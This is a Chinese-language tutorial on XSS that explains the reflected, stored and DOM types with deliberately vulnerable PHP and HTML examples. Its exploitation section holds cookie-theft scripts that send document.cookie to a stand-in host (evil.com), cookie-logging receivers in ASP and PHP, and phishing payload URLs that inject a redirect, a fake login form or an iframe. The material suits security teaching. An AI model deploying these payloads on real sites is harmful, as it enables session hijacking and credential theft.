# XSS 跨站脚本攻击

## XSS 简介

跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 Web 应用程序中的计算机安全漏洞，是由于 Web 应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。

### 反射型 XSS

反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。

反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。

服务器端代码：

```php
<?php 
// Is there any input? 
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
    // Feedback for end user 
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>'; 
} 
?>
```

可以看到，代码直接引用了 `name` 参数，并没有做任何的过滤和检查，存在明显的 XSS 漏洞。

### 持久型 XSS

持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。

此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。

服务器端代码：

```php
<?php
  if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );
    // Sanitize message input
    $message = stripslashes( $message );
    $message = mysql_real_escape_string( $message );
    // Sanitize name input
    $name = mysql_real_escape_string( $name );
    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );
    //mysql_close(); }
?>
```

代码只对一些空白符、特殊符号、反斜杠进行了删除或转义，没有做 XSS 的过滤和检查，且存储在数据库中，明显存在存储型 XSS 漏洞。

### DOM XSS

传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。

HTML 代码：

```html
<html>
  <head>
    <title>DOM-XSS test</title>
  </head>
  <body>
    <script>
      var a=document.URL;
      document.write(a.substring(a.indexOf("a=")+2,a.length));
    </script>
  </body>
</html>
```

将代码保存在 domXSS.html 中，浏览器访问：

```
http://127.0.0.1/domXSS.html?a=<script>alert('XSS')</script>
```

即可出发 XSS 漏洞。

## XSS 利用方式

### Cookies 窃取

攻击者可以使用以下代码获取客户端的 Cookies 信息：

```html
<script>
document.location="http://www.evil.com/cookie.asp?cookie="+document.cookie
new Image().src="http://www.evil.com/cookie.asp?cookie="+document.cookie
</script>
<img src="http://www.evil.com/cookie.asp?cookie="+document.cookie></img>
```

在远程服务器上，有一个接受和记录 Cookies 信息的文件，示例如下：

```asp
<%
  msg=Request.ServerVariables("QUERY_STRING")
  testfile=Server.MapPath("cookie.txt")
  set fs=server.CreateObject("Scripting.filesystemobject")
  set thisfile=fs.OpenTextFile(testfile,8,True,0)
  thisfile.Writeline(""&msg& "")
  thisfile.close
  set fs=nothing
%>
```

```php
<?php
$cookie = $_GET['cookie'];
$log = fopen("cookie.txt", "a");
fwrite($log, $cookie . "\n");
fclose($log);
?>
```

攻击者在获取到 Cookies 之后，通过修改本机浏览器的 Cookies，即可登录受害者的账户。

### 会话劫持

由于使用 Cookies 存在一定的安全缺陷，因此，开发者开始使用一些更为安全的认证方式，如 Session。在 Session 机制中，客户端和服务端通过标识符来识别用户身份和维持会话，但这个标识符也有被其他人利用的可能。会话劫持的本质是在攻击中带上了 Cookies 并发送到了服务端。

如某 CMS 的留言系统存在一个存储型 XSS 漏洞，攻击者把 XSS 代码写进留言信息中，当管理员登录后台并查看是，便会触发 XSS 漏洞，由于 XSS 是在后台触发的，所以攻击的对象是管理员，通过注入 JavaScript 代码，攻击者便可以劫持管理员会话执行某些操作，从而达到提升权限的目的。

比如，攻击者想利用 XSS 添加一个管理员账号，只需要通过之前的代码审计或其他方式，截取到添加管理员账号时的 HTTP 请求信息，然后使用 XMLHTTP 对象在后台发送一个 HTTP 请求即可，由于请求带上了被攻击者的 Cookies，并一同发送到服务端，即可实现添加一个管理员账户的操作。

### 钓鱼

- 重定向钓鱼

  把当前页面重定向到一个钓鱼页面。

  ```
  http://www.bug.com/index.php?search="'><script>document.location.href="http://www.evil.com"</script>
  ```

- HTML 注入式钓鱼

  使用 XSS 漏洞注入 HTML 或 JavaScript 代码到页面中。

  ```
  http://www.bug.com/index.php?search="'<html><head><title>login</title></head><body><div style="text-align:center;"><form Method="POST" Action="phishing.php" Name="form"><br /><br />Login:<br/><input name="login" /><br />Password:<br/><input name="Password" type="password" /><br/><br/><input name="Valid" value="Ok" type="submit" /><br/></form></div></body></html>
  ```

  该段代码会在正常页面中嵌入一个 Form 表单。

- iframe 钓鱼

  这种方式是通过 `<iframe>` 标签嵌入远程域的一个页面实施钓鱼。

  ```
  http://www.bug.com/index.php?search='><iframe src="http://www.evil.com" height="100%" width="100%"</iframe>
  ```

- Flash 钓鱼

  将构造好的 Flash 文件传入服务器，在目标网站用`<object>`或`<embed>`标签引用即可。

- 高级钓鱼技术

  注入代码劫持 HTML 表单、使用 JavaScript 编写键盘记录器等。

### 网页挂马

一般都是通过篡改网页的方式来实现的，如在 XSS 中使用`<iframe>`标签。

### DOS 与 DDOS

注入恶意 JavaScript 代码，可能会引起一些拒绝服务攻击。

### XSS 蠕虫

通过精心构造的 XSS 代码，可以实现非法转账、篡改信息、删除文章、自我复制等诸多功能。